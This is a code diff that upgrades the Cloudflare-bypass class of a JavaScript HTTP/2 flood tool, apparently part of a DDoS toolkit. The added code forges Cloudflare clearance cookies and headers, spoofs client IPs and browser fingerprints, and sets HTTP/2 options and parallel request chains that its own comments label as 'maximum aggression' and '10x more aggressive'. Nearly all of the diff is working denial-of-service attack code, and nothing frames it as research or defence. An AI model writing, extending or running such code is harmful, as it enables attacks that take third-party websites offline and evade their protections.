@@ -179,18 +179,49 @@ export class HTTP2PostFlood extends HTTP2Flood {
 }
 
 /**
- * HTTP/2 Cloudflare Bypass
+ * HTTP/2 Cloudflare Bypass - IMPROVED AGGRESSIVE VERSION
  */
 export class HTTP2CFBypass extends HTTP2Flood {
+    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
+        super(targetUrl, duration, rpc, userAgents, referers, proxies);
+        this.cookies = new Map();
+        // Pre-generate realistic cookies
+        this.cookies.set('cf_clearance', Tools.randomString(40) + '-' + Date.now());
+        this.cookies.set('__cf_bm', Tools.randomString(64));
+        this.cookies.set('_ga', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
+        this.cookies.set('_gid', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
+    }
+
     generateHeaders() {
         const headers = super.generateHeaders();
         
-        // Add Cloudflare bypass headers
-        headers['cf-ray'] = Tools.randomString(16);
+        // Advanced Cloudflare bypass headers
+        headers['cf-ray'] = Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL']);
         headers['cf-connecting-ip'] = Tools.randomIPv4();
-        headers['cf-ipcountry'] = 'US';
+        headers['cf-ipcountry'] = Tools.randomChoice(['US', 'GB', 'DE', 'FR', 'CA', 'AU']);
         headers['cf-visitor'] = '{"scheme":"https"}';
         headers['cdn-loop'] = 'cloudflare';
+        headers['x-forwarded-proto'] = 'https';
+        headers['x-forwarded-for'] = Tools.randomIPv4();
+        headers['x-real-ip'] = Tools.randomIPv4();
+        
+        // Browser fingerprinting headers
+        headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
+        headers['sec-ch-ua-mobile'] = '?0';
+        headers['sec-ch-ua-platform'] = Tools.randomChoice(['"Windows"', '"macOS"', '"Linux"']);
+        headers['sec-ch-ua-arch'] = '"x86"';
+        headers['sec-ch-ua-bitness'] = '"64"';
+        headers['sec-ch-ua-full-version-list'] = '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130"';
+        
+        // Add realistic cookies
+        const cookieString = Array.from(this.cookies.entries())
+            .map(([k, v]) => `${k}=${v}`)
+            .join('; ');
+        headers['cookie'] = cookieString;
+        
+        // Add cache busting
+        const cacheBuster = `?_cb=${Date.now()}_${Tools.randomString(8)}`;
+        headers[':path'] = headers[':path'] + cacheBuster;
         
         return headers;
     }
@@ -200,7 +231,16 @@ export class HTTP2CFBypass extends HTTP2Flood {
             const client = http2.connect(this.url.origin, {
                 rejectUnauthorized: false,
                 // Use modern ALPN protocols
-                ALPNProtocols: ['h2', 'http/1.1']
+                ALPNProtocols: ['h2', 'http/1.1'],
+                // HTTP/2 settings for maximum aggression
+                settings: {
+                    headerTableSize: 65536,
+                    enablePush: true,
+                    initialWindowSize: 6291456,
+                    maxFrameSize: 16384,
+                    maxConcurrentStreams: 1000,
+                    maxHeaderListSize: 262144
+                }
             });
 
             client.on('error', () => {
@@ -208,8 +248,11 @@ export class HTTP2CFBypass extends HTTP2Flood {
                 resolve();
             });
 
+            let requestsSent = 0;
+            const totalRequests = this.rpc * 10; // 10x more aggressive
+
             const makeRequest = () => {
-                if (!this.active) {
+                if (!this.active || requestsSent >= totalRequests) {
                     client.close();
                     resolve();
                     return;
@@ -218,32 +261,57 @@ export class HTTP2CFBypass extends HTTP2Flood {
                 try {
                     const req = client.request(this.generateHeaders(), {
                         weight: 256,
-                        exclusive: false
+                        exclusive: false,
+                        parent: 0
                     });
 
-                    req.on('response', () => {
+                    req.on('response', (responseHeaders) => {
                         REQUESTS_SENT.add(1);
+                        
+                        // Extract and save cookies from response
+                        if (responseHeaders['set-cookie']) {
+                            const cookies = Array.isArray(responseHeaders['set-cookie']) 
+                                ? responseHeaders['set-cookie'] 
+                                : [responseHeaders['set-cookie']];
+                            
+                            cookies.forEach(cookie => {
+                                const [nameValue] = cookie.split(';');
+                                const [name, value] = nameValue.split('=');
+                                if (name && value) {
+                                    this.cookies.set(name.trim(), value.trim());
+                                }
+                            });
+                        }
                     });
 
-                    req.on('data', () => {});
+                    req.on('data', (chunk) => {
+                        BYTES_SENT.add(chunk.length);
+                    });
+                    
                     req.on('end', () => {});
                     req.on('error', () => {});
 
                     req.end();
-                    BYTES_SENT.add(250);
+                    BYTES_SENT.add(500); // Accounting for headers
+                    requestsSent++;
+                    
+                    // Continue immediately for maximum speed
+                    setImmediate(makeRequest);
                 } catch (e) {
-                    // Silent fail
+                    // Silent fail and continue
+                    setImmediate(makeRequest);
                 }
             };
 
-            for (let i = 0; i < this.rpc; i++) {
+            // Start multiple request chains simultaneously
+            for (let i = 0; i < 20; i++) {
                 makeRequest();
             }
 
             setTimeout(() => {
                 client.close();
                 resolve();
-            }, 1000);
+            }, 2000); // Longer timeout for more requests
         });
     }
 }
